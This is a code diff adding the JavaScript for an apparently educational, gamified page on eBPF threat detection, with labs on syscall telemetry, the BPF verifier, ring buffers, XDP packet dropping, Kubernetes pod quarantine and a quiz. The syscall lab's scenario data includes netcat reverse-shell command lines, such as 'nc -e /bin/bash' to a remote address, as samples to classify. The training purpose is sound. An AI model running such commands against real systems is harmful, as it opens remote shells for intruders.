+document.querySelectorAll('.lazy-reveal').forEach(el => lazyObs.observe(el));
+
+// ─── LAZY LOAD: Canvas — only draw when visible ───
+const canvasObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      const id = e.target.id;
+      if (id === 'verifier-canvas') runVerifier();
+      if (id === 'ringbuf-canvas') drawRingBuf();
+      if (id === 'xdp-canvas') drawXDP(2, 'xdp');
+      canvasObs.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.1 });
+['verifier-canvas','ringbuf-canvas','xdp-canvas'].forEach(id => {
+  const el = document.getElementById(id);
+  if (el) canvasObs.observe(el);
+});
+
+// ─── XP SYSTEM ───
+let xp = 0; const XP_MAX = 600;
+const labsDone = new Set();
+function addXP(n, msg) {
+  xp = Math.min(XP_MAX, xp + n);
+  document.getElementById('xpFill').style.width = (xp / XP_MAX * 100) + '%';
+  document.getElementById('xpText').textContent = xp + ' / ' + XP_MAX;
+  document.querySelectorAll('.comfy-xbadge').forEach(b => {
+    if (xp >= +b.dataset.xp && !b.classList.contains('earned')) {
+      b.classList.add('earned'); showToast('🏅 ' + b.title + ' unlocked!');
+    }
+  });
+  if (msg) showToast('+' + n + ' XP — ' + msg);
+}
+function showToast(msg) {
+  const t = document.createElement('div'); t.className = 'comfy-toast'; t.textContent = msg;
+  document.body.appendChild(t); setTimeout(() => { t.style.opacity='0'; t.style.transform='translateY(20px)'; setTimeout(()=>t.remove(),400); }, 2600);
+}
+
+// ─── PROGRESS TRACKER ───
+function markDone(n) {
+  labsDone.add(n);
+  const el = document.getElementById('ps-' + n); if(el) el.classList.add('done');
+  const sep = document.getElementById('psp-' + (n-1)); if(sep) sep.classList.add('done');
+  // Mark next active
+  const next = document.getElementById('ps-' + (n+1)); if(next && !next.classList.contains('done')) next.classList.add('active');
+}
+
+// ─── NAV TABS ───
+document.querySelectorAll('.comfy-nav-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.comfy-nav-tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    const el = document.getElementById(tab.dataset.target);
+    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  });
+});
+
+// ─── PIPELINE ANIMATION ───
+let pipeAnim = null;
+document.getElementById('animatePipeline').addEventListener('click', () => {
+  clearInterval(pipeAnim);
+  const steps = document.querySelectorAll('#overview-pipeline .comfy-pipe-step');
+  steps.forEach(s => s.classList.remove('active','firing'));
+  let i = 0;
+  pipeAnim = setInterval(() => {
+    if (i < steps.length) { steps[i].classList.add('active','firing'); i++; }
+    else { clearInterval(pipeAnim); }
+  }, 550);
+  addXP(10, 'Pipeline visualized!');
+});
+document.getElementById('resetPipeline').addEventListener('click', () => {
+  clearInterval(pipeAnim);
+  document.querySelectorAll('#overview-pipeline .comfy-pipe-step').forEach((s,i) => {
+    s.classList.toggle('active', i===0); s.classList.remove('firing');
+  });
+});
+
+// ─── LAB 1: SYSCALL ───
+const SCENARIOS = [
+  { pid:442644, ppid:442332, comm:'bash', file:'/usr/bin/nc', args:'-e /bin/bash 10.0.0.1 4444', answer:'THREAT', reason:'netcat with -e flag (exec shell) spawned from bash = classic reverse shell. This is PID 442644 from Test 1.' },
+  { pid:1234, ppid:999, comm:'gnome-terminal', file:'/usr/lib/vte-urlencode-cwd', args:'', answer:'FP', reason:'File contains "nc" substring but is a harmless GNOME Terminal helper. This is the false positive from Test 1 — naive string matching fails.' },
+  { pid:8821, ppid:1, comm:'sshd', file:'/bin/bash', args:'-l', answer:'BENIGN', reason:'sshd (parent: systemd) spawning a login bash shell = normal SSH remote access.' },
+  { pid:5501, ppid:5498, comm:'apache2', file:'/bin/bash', args:'-c nc 10.0.0.1 5555', answer:'THREAT', reason:'apache2 → bash → nc process chain = classic web shell compromise. CRITICAL severity.' },
+  { pid:7712, ppid:1, comm:'cron', file:'/usr/bin/nc', args:'--listen 9999', answer:'BENIGN', reason:'Cron job running nc in listen mode from systemd parent = likely scheduled health monitoring.' },
+  { pid:3310, ppid:3300, comm:'nmap', file:'/usr/bin/nc', args:'-z 192.168.1.0/24 80', answer:'BENIGN', reason:'nmap orchestrating nc for port scanning = authorized pen test activity.' },
+];
+let selSc = 0;
+function selectScenario(idx) {
+  selSc = idx;
+  document.querySelectorAll('.comfy-scenario').forEach((c,i) => c.classList.toggle('selected', i===idx));
+  const s = SCENARIOS[idx];
+  document.getElementById('syscall-telemetry').textContent =
+`🔴 eBPF EVENT — sys_enter_execve
+─────────────────────────────────────
+PID  : ${s.pid}    PPID : ${s.ppid}
+COMM : ${s.comm}
+FILE : ${s.file}
+ARGS : ${s.args || '(none)'}
+─────────────────────────────────────
+Naïve match — 'nc' in filename? ${s.file.includes('nc') ? 'YES → FLAGGED ⚠️' : 'NO → CLEAN ✅'}
+Heuristic score: ${s.file.includes('nc') ? '0.72 (flagged by detector.py)' : '0.11 (clean)'}`;
+  document.getElementById('syscall-result').textContent = '';
+  document.getElementById('syscall-result').className = 'comfy-output';
+  if (!labsDone.has(1)) addXP(5, 'Scenario selected');
+}
+function judgeScenario(verdict) {
+  const s = SCENARIOS[selSc]; const correct = verdict === s.answer;
+  const el = document.getElementById('syscall-result');
+  el.className = 'comfy-output ' + (correct ? 'comfy-output-safe' : 'comfy-output-threat');
+  el.textContent = correct ? '✅ CORRECT!\n💡 ' + s.reason : '❌ INCORRECT. Correct answer: ' + s.answer + '\n💡 ' + s.reason;
+  if (correct) { addXP(20, 'Correct threat judgment!'); markDone(1); }
+}
+selectScenario(0);
+
+// ─── LAB 2A: VERIFIER ───
+function runVerifier() {
+  const mode = document.getElementById('verifier-attack').value;
+  const canvas = document.getElementById('verifier-canvas');
+  if (!canvas || !canvas.isConnected) return;
+  const dpr = window.devicePixelRatio || 1;
+  canvas.width = (canvas.offsetWidth || 500) * dpr; canvas.height = 90 * dpr;
+  const ctx = canvas.getContext('2d'); ctx.scale(dpr, dpr);
+  const W = canvas.offsetWidth || 500, H = 90; ctx.clearRect(0,0,W,H);
+  const steps = mode === 'safe'
+    ? [{x:.1,l:'Parse',ok:true},{x:.3,l:'JIT',ok:true},{x:.55,l:'Verify',ok:true},{x:.75,l:'Load',ok:true},{x:.92,l:'PASS ✅',ok:true}]
+    : [{x:.1,l:'Parse',ok:true},{x:.35,l:'JIT',ok:true},{x:.58,l:'Verify',ok:false},{x:.82,l:'REJECT ❌',ok:false}];
+  steps.forEach((s,i) => {
+    const x = s.x*W, y = 44;
+    if (i > 0) {
+      ctx.beginPath(); ctx.moveTo(steps[i-1].x*W+13,y); ctx.lineTo(x-13,y);
+      ctx.strokeStyle = s.ok ? '#4ade80' : '#f87171'; ctx.lineWidth = 2; ctx.stroke();
+    }
+    ctx.beginPath(); ctx.arc(x,y,12,0,Math.PI*2);
+    ctx.fillStyle = s.ok ? 'rgba(74,222,128,0.15)' : 'rgba(248,113,113,0.15)'; ctx.fill();
+    ctx.strokeStyle = s.ok ? '#4ade80' : '#f87171'; ctx.lineWidth = 2; ctx.stroke();
+    ctx.fillStyle = s.ok ? '#4ade80' : '#f87171';
+    ctx.font = 'bold 9px Inter'; ctx.textAlign = 'center'; ctx.fillText(s.l, x, y+27);
+  });
+  const msgs = {
+    safe: '✅ VERIFIER PASSED\n─────────────────\nInstructions: 24 · Loop-free: YES\nMemory safe: PROVEN · Bound checks: PASS\n\n→ JIT-compiled. Attached to sys_enter_execve.',
+    loop: '❌ VERIFIER REJECTED: Infinite Loop\n─────────────────\nwhile(1){} at instruction 8 — no termination proof\nVerifier limit: 1,000,000 instructions\n\n→ Refused. Kernel untouched. Machine alive.',
+    oob:  '❌ VERIFIER REJECTED: Out-of-Bounds\n─────────────────\nPointer access unchecked at instruction 12\nRequired: if(ptr+1 > data_end) return XDP_PASS\n\n→ Refused. Kernel protected.',
+    null: '❌ VERIFIER REJECTED: NULL Dereference\n─────────────────\nPotential NULL at instruction 9\nRequired: null-check before ptr dereference\n\n→ Refused. No crash possible.',
+    bigloop: '❌ VERIFIER REJECTED: Instruction Limit\n─────────────────\n100k → 500k → 1,000,000 instructions\nBPF state limit exceeded.\nSame result as while(1){}\n\n→ Refused. Kernel alive.'
+  };
+  const out = document.getElementById('verifier-out');
+  out.className = 'comfy-output ' + (mode==='safe' ? 'comfy-output-safe' : 'comfy-output-threat');
+  out.textContent = msgs[mode];
+  if (mode !== 'safe') { addXP(15, 'Verifier bomb caught!'); markDone(2); }
+}
+
+// ─── LAB 2B: KO VS EBPF ───
+function runKoVsEbpf() {
+  const m = document.getElementById('ko-vs-ebpf').value;
+  const M = {
+    loop:{ko:'💀 KERNEL PANIC!\n────────────────\nCPU0: soft lockup detected\nkernel panic - not syncing\n\nMachine DEAD. Physical reboot.',ebpf:'✅ VERIFIER REJECTED\n────────────────\nInfinite loop detected pre-load.\n\nKernel ALIVE. Zero panic.'},
+    nullptr:{ko:'💀 KERNEL OOPS!\n────────────────\nNULL ptr dereference\nPGD: 0000000000000000\nState corrupted.',ebpf:'✅ VERIFIER REJECTED\n────────────────\nNULL deref at instruction 9.\nKernel PROTECTED.'},
+    oob:{ko:'💀 MEMORY CORRUPTION!\n────────────────\nKASAN: slab-out-of-bounds\nKernel heap corrupted!',ebpf:'✅ VERIFIER REJECTED\n────────────────\nMissing: if(ptr+1 > data_end)\nKernel INTACT.'},
+    panic:{ko:'💀 IMMEDIATE PANIC!\n────────────────\nKernel forced panic();\nAll connections dropped.',ebpf:'✅ IMPOSSIBLE IN eBPF\n────────────────\npanic() not in BPF whitelist.\nOnly 280 approved helpers.'}
+  };
+  document.getElementById('ko-out').textContent = M[m].ko;
+  document.getElementById('ebpf-out').textContent = M[m].ebpf;
+  addXP(10, 'Comparison done'); markDone(2);
+}
+runKoVsEbpf();
+
+// ─── LAB 3: RING BUFFER ───
+let ringRunning=false, ringTimer=null, ringProduced=0, ringConsumed=0, ringDropped=0, ringBuf=[];
+function updateRingBuf() {
+  document.getElementById('ev-rate-val').textContent = document.getElementById('ev-rate').value;
+  document.getElementById('buf-size-val').textContent = document.getElementById('buf-size').value;
+  document.getElementById('poll-speed-val').textContent = document.getElementById('poll-speed').value;
+}
+function toggleRingBuf() {
+  ringRunning = !ringRunning;
+  document.getElementById('ringbuf-start').textContent = ringRunning ? '⏸ Pause' : '▶ Start';
+  if (ringRunning) { addXP(15, 'Ring buffer started!'); runRingBufSim(); }
+  else clearTimeout(ringTimer);
+}
+function resetRingBuf() {
+  ringRunning=false; clearTimeout(ringTimer);
+  ringProduced=ringConsumed=ringDropped=0; ringBuf=[];
+  document.getElementById('ringbuf-start').textContent='▶ Start';
+  document.getElementById('ringbuf-stats').textContent='';
+  drawRingBuf();
+}
+function runRingBufSim() {
+  if (!ringRunning) return;
+  const rate=+document.getElementById('ev-rate').value;
+  const cap=+document.getElementById('buf-size').value;
+  const poll=+document.getElementById('poll-speed').value;
+  const add=Math.max(1,Math.round(rate*poll/1000));
+  for(let i=0;i<add;i++){if(ringBuf.length<cap){ringBuf.push(ringProduced++);}else{ringDropped++;ringProduced++;}}
+  const consume=Math.max(1,Math.round(0.7*add));
+  for(let i=0;i<Math.min(consume,ringBuf.length);i++){ringBuf.shift();ringConsumed++;}
+  const dp=ringProduced>0?((ringDropped/ringProduced)*100).toFixed(1):'0.0';
+  document.getElementById('ringbuf-stats').textContent=`Produced : ${ringProduced.toLocaleString()}\nConsumed : ${ringConsumed.toLocaleString()}\nDROPPED  : ${ringDropped.toLocaleString()} (${dp}%)\nOccupancy: ${ringBuf.length}/${cap} slots\nPoll     : ${poll}ms`;
+  drawRingBuf();
+  if (ringDropped > 0) markDone(3);
+  ringTimer=setTimeout(runRingBufSim,poll);
+}
+function drawRingBuf() {
+  const canvas = document.getElementById('ringbuf-canvas');
+  if (!canvas || !canvas.isConnected) return;
+  const dpr=window.devicePixelRatio||1;
+  canvas.width=(canvas.offsetWidth||380)*dpr; canvas.height=240*dpr;
+  const ctx=canvas.getContext('2d'); ctx.scale(dpr,dpr);
+  const W=canvas.offsetWidth||380,H=240;
+  ctx.clearRect(0,0,W,H);
+  const cap=+document.getElementById('buf-size').value;
+  const cols=Math.min(cap,Math.floor((W-32)/22));
+  const slotW=Math.min(26,(W-32)/cols),slotH=19;
+  ctx.fillStyle='#4ade80';ctx.font='bold 10px Inter';ctx.textAlign='left';ctx.fillText('Ring Buffer Slots',16,20);
+  for(let i=0;i<cap;i++){
+    const col=i%cols,row=Math.floor(i/cols);
+    const x=16+col*(slotW+3),y=28+row*(slotH+3);
+    const filled=i<ringBuf.length;
+    ctx.fillStyle=filled?(ringDropped>0?'rgba(248,113,113,0.55)':'rgba(74,222,128,0.45)'):'rgba(255,255,255,0.03)';
+    ctx.beginPath();ctx.rect(x,y,slotW,slotH);ctx.fill();
+    ctx.strokeStyle=filled?(ringDropped>0?'#f87171':'#4ade80'):'rgba(255,255,255,0.07)';ctx.lineWidth=1;ctx.stroke();
+  }
+  const rows=Math.ceil(cap/cols);
+  const fp=ringBuf.length/cap;
+  const barY=28+rows*(slotH+3)+12,barX=16,barW=W-32,barH=12;
+  ctx.fillStyle='rgba(255,255,255,0.04)';ctx.beginPath();ctx.rect(barX,barY,barW,barH);ctx.fill();
+  ctx.fillStyle=fp>0.8?'#f87171':fp>0.5?'#fbbf24':'#4ade80';
+  ctx.beginPath();ctx.rect(barX,barY,barW*fp,barH);ctx.fill();
+  ctx.fillStyle='#635f59';ctx.font='10px Inter';ctx.textAlign='center';
+  ctx.fillText('Buffer: '+Math.round(fp*100)+'% full · '+(ringDropped>0?ringDropped.toLocaleString()+' dropped':'no drops'),W/2,H-8);
+}
+drawRingBuf();
+
+// ─── LAB 4A: TYPESAFE AI ───
+const PROC_RISK={nc:0.88,bash:0.35,python3:0.45,curl:0.92,gnome:0.05,sshd:0.20};
+const PPID_RISK={bash:0.55,apache:0.95,cron:0.30,sshd:0.25,systemd:0.10,'gnome-terminal':0.05};
+const LLM_FREE={KILL:'I think you should probably consider terminating that process... netcat is often associated with attacks. I would recommend investigating further, but if you\'re sure, running kill -9 on that PID might be appropriate. However I should caution that...',QUARANTINE:'This is somewhat ambiguous. On one hand it could be legitimate monitoring, on the other hand it could be malicious. I would suggest perhaps quarantining or escalating to a senior analyst for manual review...',IGNORE:'Based on the context provided, this appears to be a normal system process. I don\'t see immediate cause for alarm. You might want to keep monitoring it just to be safe...'};
+function runTypeSafe() {
+  const proc=document.getElementById('proc-select').value;
+  const ppid=document.getElementById('ppid-select').value;
+  const prob=Math.min(0.99,(PROC_RISK[proc]*0.5+PPID_RISK[ppid]*0.5));
+  const action=prob>0.85?'KILL_PROCESS':prob>0.60?'QUARANTINE_POD':'IGNORE_EVENT';
+  const conf=prob>0.85?0.97:prob>0.60?0.84:0.91;
+  const lkey=prob>0.85?'KILL':prob>0.60?'QUARANTINE':'IGNORE';
+  const tsEl=document.getElementById('typesafe-out');
+  tsEl.className='comfy-output comfy-output-purple';
+  tsEl.textContent=`# TypeSafe → typed Python variables\naction.probability = ${prob.toFixed(2)}  # always 0.0–1.0\naction.choice      = "${action}"\naction.confidence  = ${conf.toFixed(2)}\n\n# Parser never raises — code acts directly:\nif action.choice == "KILL_PROCESS":\n    terminate_pid(${442644})`;
+  document.getElementById('llm-out').textContent=LLM_FREE[lkey];
+  addXP(15,'TypeSafe AI invoked!'); markDone(4);
+}
+runTypeSafe();
+
+// ─── LAB 4B: NOUL SIGNALS ───
+const SIGNALS=[
+  {label:'Process is netcat (nc)',weight:0.30,active:true},
+  {label:'Parent is a web server (apache2)',weight:0.35,active:false},
+  {label:'Command has -e flag (exec shell)',weight:0.18,active:false},
+  {label:'Outbound network connection opened',weight:0.20,active:false},
+  {label:'Spawned from interactive bash shell',weight:0.12,active:false},
+  {label:'After-hours execution (02:00 UTC)',weight:0.10,active:false},
+];
+function renderSignals() {
+  document.getElementById('signal-list').innerHTML=SIGNALS.map((s,i)=>`
+    <div style="display:flex;align-items:center;gap:11px;margin:7px 0;cursor:pointer;padding:7px 10px;border-radius:var(--radius-sm);background:${s.active?'rgba(251,191,36,0.06)':'transparent'};border:1px solid ${s.active?'rgba(251,191,36,0.25)':'transparent'};transition:all 0.2s;" onclick="toggleSignal(${i})" role="checkbox" aria-checked="${s.active}">
+      <div style="width:18px;height:18px;border-radius:5px;border:2px solid ${s.active?'var(--amber)':'var(--border-soft)'};background:${s.active?'rgba(251,191,36,0.2)':'transparent'};display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.2s;">
+        ${s.active?'<span style="color:var(--amber);font-size:11px;font-weight:900;">✓</span>':''}
+      </div>
+      <span style="font-size:13px;flex:1;color:${s.active?'var(--text)':'var(--text-muted)'};">${s.label}</span>
+      <span style="font-family:var(--mono);font-size:11px;color:var(--text-dim);">+${s.weight.toFixed(2)}</span>
+    </div>
+  `).join('');
+  computeNoul();
+}
+function toggleSignal(i){SIGNALS[i].active=!SIGNALS[i].active;renderSignals();addXP(5,'Signal toggled');}
+function computeNoul(){
+  const prob=Math.min(0.99,SIGNALS.filter(s=>s.active).reduce((a,s)=>a+s.weight,0));
+  const bar=document.getElementById('noul-bar');
+  bar.style.width=(prob*100)+'%';
+  bar.style.background=prob>0.8?'var(--red)':prob>0.6?'var(--amber)':'var(--green)';
+  const action=prob>0.8?'KILL_PROCESS':prob>0.6?'QUARANTINE_POD':'IGNORE_EVENT';
+  const el=document.getElementById('noul-decision');
+  el.className='comfy-output '+(prob>0.8?'comfy-output-threat':prob>0.6?'comfy-output-warn':'comfy-output-safe');
+  el.textContent=`Noul = ${prob.toFixed(2)}  →  Choice = "${action}"\nThreshold: KILL > 0.80  ·  QUARANTINE > 0.60  ·  IGNORE ≤ 0.60`;
+}
+renderSignals();
+
+// ─── LAB 5: XDP ───
+function updateXDP(){
+  const pps=+document.getElementById('attack-pps').value;
+  const mode=document.getElementById('fw-mode').value;
+  document.getElementById('attack-pps-val').textContent=pps.toLocaleString();
+  const cpu=mode==='xdp'?Math.min(8,2+pps/2000000):mode==='iptables'?Math.min(96,5+pps/120000):Math.min(100,pps/80000);
+  const dropped=mode==='xdp'?pps:mode==='iptables'?Math.round(pps*0.6):0;
+  const status=cpu>80?'🔴 UNRESPONSIVE':cpu>50?'🟡 DEGRADED':'🟢 OPERATIONAL';
+  document.getElementById('xdp-stats').textContent=`Mode    : ${mode.toUpperCase()}\nPPS     : ${pps.toLocaleString()}\nDropped : ${dropped.toLocaleString()}/s\nCPU     : ${cpu.toFixed(1)}%\nServer  : ${status}`;
+  drawXDP(cpu,mode);
+  if(pps>1000000&&mode==='xdp'){addXP(20,'XDP defended 1M+ PPS!');markDone(5);}
+}
+function drawXDP(cpu,mode){
+  const canvas=document.getElementById('xdp-canvas');
+  if(!canvas||!canvas.isConnected)return;
+  const dpr=window.devicePixelRatio||1;
+  canvas.width=(canvas.offsetWidth||380)*dpr;canvas.height=280*dpr;
+  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
+  const W=canvas.offsetWidth||380,H=280,cx=W/2,cy=128,r=76;
+  ctx.clearRect(0,0,W,H);
+  // Arc background
+  ctx.beginPath();ctx.arc(cx,cy,r,Math.PI,2*Math.PI);ctx.strokeStyle='rgba(255,255,255,0.05)';ctx.lineWidth=18;ctx.stroke();
+  // Arc fill
+  const ang=Math.PI+Math.min(1,cpu/100)*Math.PI;
+  const g=ctx.createLinearGradient(cx-r,cy,cx+r,cy);
+  g.addColorStop(0,'#4ade80');g.addColorStop(0.5,'#fbbf24');g.addColorStop(1,'#f87171');
+  ctx.beginPath();ctx.arc(cx,cy,r,Math.PI,ang);ctx.strokeStyle=g;ctx.lineWidth=18;ctx.lineCap='round';ctx.stroke();
+  // CPU text
+  ctx.fillStyle=cpu>80?'#f87171':cpu>50?'#fbbf24':'#4ade80';
+  ctx.font='bold 32px JetBrains Mono';ctx.textAlign='center';ctx.fillText(cpu.toFixed(0)+'%',cx,cy+12);
+  ctx.fillStyle='#635f59';ctx.font='10px Inter';ctx.fillText('CPU Usage',cx,cy+32);
+  // Mode label
+  ctx.fillStyle='#9e9690';ctx.font='10px Inter';
+  ctx.fillText(mode==='xdp'?'XDP: drops at NIC driver (pre sk_buff)':mode==='iptables'?'iptables: drops in kernel network stack':'No firewall: all packets reach CPU',cx,H-12);
+  // Tick labels
+  ctx.fillStyle='rgba(255,255,255,0.3)';ctx.font='bold 9px Inter';
+  ctx.fillText('0%',cx-r-6,cy+12);ctx.fillText('100%',cx+r+10,cy+12);
+}
+drawXDP(2,'xdp');
+
+// ─── LAB 6: K8S AUTOSOC ───
+const POD_NAMES=['frontend','api-gateway','auth-svc','payment','db-primary','cache','worker-1','worker-2','logging','metrics','ingress','scheduler'];
+let clusterState=[];
+function initCluster(){clusterState=POD_NAMES.map(n=>({name:n,compromised:false,quarantined:false}));renderCluster();}
+function renderCluster(){
+  document.getElementById('cluster-grid').innerHTML=clusterState.map((pod,i)=>{
+    const cls=pod.quarantined?'quarantined':pod.compromised?'compromised':'';
+    const icon=pod.quarantined?'🔒':pod.compromised?'⚠️':'🟢';
+    const clr=pod.quarantined?'#f87171':pod.compromised?'#fbbf24':'#4ade80';
+    return `<div class="comfy-pod ${cls}" onclick="togglePod(${i})" title="${pod.name}">
+      <div style="font-size:1.3rem;">${icon}</div>
+      <div style="font-size:9px;font-family:var(--mono);color:${clr};margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${pod.name}</div>
+      <div style="font-size:8px;color:var(--text-dim);">${pod.quarantined?'ISOLATED':pod.compromised?'THREAT':'healthy'}</div>
+    </div>`;
+  }).join('');
+}
+function togglePod(i){clusterState[i].compromised=!clusterState[i].compromised;if(!clusterState[i].compromised)clusterState[i].quarantined=false;renderCluster();}
+function infectedPod(){
+  const h=clusterState.filter(p=>!p.compromised);if(!h.length)return;
+  const pod=h[Math.floor(Math.random()*h.length)];pod.compromised=true;renderCluster();
+  appendLog(`[${ts()}] 🔴 eBPF: sys_enter_execve → pod '${pod.name}'\n         PID: ${Math.floor(Math.random()*9e5+1e5)} | COMM: bash | FILE: /usr/bin/nc\n         TypeSafe → Noul=0.95 → KILL_PROCESS\n         Labeling: security=compromised`);
+  addXP(10,'Attack injected!');
+}
+function runOperator(){
+  const targets=clusterState.filter(p=>p.compromised&&!p.quarantined);
+  if(!targets.length){appendLog(`[${ts()}] ☸️ Operator: No compromised pods found.`);return;}
+  targets.forEach((pod,i)=>{
+    setTimeout(()=>{
+      pod.quarantined=true;renderCluster();
+      appendLog(`[${ts()}] ☸️ OPERATOR: Pod '${pod.name}' → quarantine=true\n         NetworkPolicy: deny-all-egress+ingress applied\n         🔒 ISOLATED in ${Math.floor(Math.random()*120+280)}ms`);
+      addXP(15,`'${pod.name}' isolated!`); markDone(6);
+      [0,1,2,3,4].forEach((si)=>setTimeout(()=>{
+        document.querySelectorAll('[id^=k8s-p]').forEach((el,ei)=>el.classList.toggle('active',ei<=si));
+      },si*380));
+    },i*850);
+  });
+}
+function runFullScenario(){
+  resetCluster();
+  appendLog(`[${ts()}] ⚡ FULL AUTO-SCENARIO\n`);
+  setTimeout(infectedPod,350);
+  setTimeout(()=>appendLog(`[${ts()}] 🔵 Ring buffer event → Python agent\n         Heuristic score: 0.82 → TypeSafe invoked`),1000);
+  setTimeout(()=>appendLog(`[${ts()}] 🧠 TypeSafe: Noul=0.95 → Choice="KILL_PROCESS" (conf=0.98)`),1800);
+  setTimeout(runOperator,2600);
+  addXP(30,'Full scenario run!');
+}
+function appendLog(msg){const el=document.getElementById('operator-log');el.textContent+=msg+'\n\n';el.scrollTop=el.scrollHeight;}
+function resetCluster(){initCluster();document.getElementById('operator-log').textContent='';document.querySelectorAll('[id^=k8s-p]').forEach(el=>el.classList.remove('active'));}
+function ts(){return new Date().toISOString().split('T')[1].split('.')[0];}
+initCluster();
+
+// ─── QUIZ ───
+const QUESTIONS=[
+  {q:'Why does eBPF use bpf_probe_read() instead of direct pointer dereference?',opts:['Performance optimization','To safely copy kernel memory — direct Ring 3 access causes a kernel segfault','It is optional','To enable JIT compilation'],ans:1,xp:25},
+  {q:'What does XDP_DROP mean in an XDP program?',opts:['Log the packet','Pass to iptables','Discard at NIC level before any kernel memory allocation','Block after sk_buff is allocated'],ans:2,xp:25},
+  {q:'What is the key advantage of TypeSafe Choice over a standard LLM?',opts:['Faster inference','Returns exactly one predefined enum — free text is impossible','Cheaper to run','Supports more languages'],ans:1,xp:25},
+  {q:'What triggers the NetworkPolicy in the AutoSOC Go operator?',opts:['Human analyst approves','100% CPU usage','Pod labeled security=compromised by TypeSafe','A cron job'],ans:2,xp:25},
+  {q:'Why did Test 1 produce a false positive for vte-urlencode-cwd?',opts:['eBPF bug','The string "nc" appeared as a substring — naive match fails','Verifier rejected the program','TypeSafe AI error'],ans:1,xp:25},
+  {q:'What does BPF_PERF_OUTPUT provide?',opts:['Persistent kernel storage','Lock-free zero-copy ring buffer from kernel to user space','A network socket','A way to write user memory'],ans:1,xp:25},
+  {q:'Which CPU ring does an eBPF program execute in?',opts:['Ring 3 (user space)','Ring 2','Ring 1','Ring 0 (kernel) — after Verifier approval'],ans:3,xp:25},
+  {q:'What is TypeSafe Noul?',opts:['A Choice enum','A typed primitive guaranteed to return float 0.0–1.0','A logging module','A Kubernetes CRD'],ans:1,xp:25},
+];
+let quizAnswered=new Set();
+function renderQuiz(){
+  document.getElementById('quiz-container').innerHTML=QUESTIONS.map((q,qi)=>`
+    <div style="margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid var(--border);">
+      <div style="font-weight:700;font-size:13.5px;margin-bottom:10px;color:var(--text);">Q${qi+1}. ${q.q} <span class="comfy-badge comfy-badge-amber" style="margin-left:6px;">${q.xp} XP</span></div>
+      ${q.opts.map((opt,oi)=>`<div class="comfy-quiz-opt" id="q${qi}o${oi}" onclick="answerQuiz(${qi},${oi})">${String.fromCharCode(65+oi)}) ${opt}</div>`).join('')}
+    </div>
+  `).join('');
+}
+function answerQuiz(qi,oi){
+  if(quizAnswered.has(qi))return;
+  quizAnswered.add(qi);
+  const q=QUESTIONS[qi];
+  document.querySelectorAll(`[id^=q${qi}o]`).forEach((el,i)=>{
+    el.style.pointerEvents='none';
+    if(i===q.ans)el.classList.add('correct');
+    else if(i===oi&&oi!==q.ans)el.classList.add('wrong');
+  });
+  if(oi===q.ans){addXP(q.xp,'Q'+(qi+1)+' correct!');}
+  const correct=[...quizAnswered].filter(i=>QUESTIONS[i].ans!==-1).length;
+  document.getElementById('quiz-score').textContent=`Answered: ${quizAnswered.size}/${QUESTIONS.length}`;
+  if(quizAnswered.size===QUESTIONS.length)markDone(7);
+}
+renderQuiz();
+
+// ─── KEYBOARD SHORTCUTS ───
+document.addEventListener('keydown', e => {
+  if (e.key === 'ArrowRight') {
+    const tabs = [...document.querySelectorAll('.comfy-nav-tab')];
+    const active = tabs.findIndex(t=>t.classList.contains('active'));
+    if (active < tabs.length-1) tabs[active+1].click();
+  }
+  if (e.key === 'ArrowLeft') {
+    const tabs = [...document.querySelectorAll('.comfy-nav-tab')];
+    const active = tabs.findIndex(t=>t.classList.contains('active'));
+    if (active > 0) tabs[active-1].click();
+  }
+});
+</script>
+</body>
+</html>
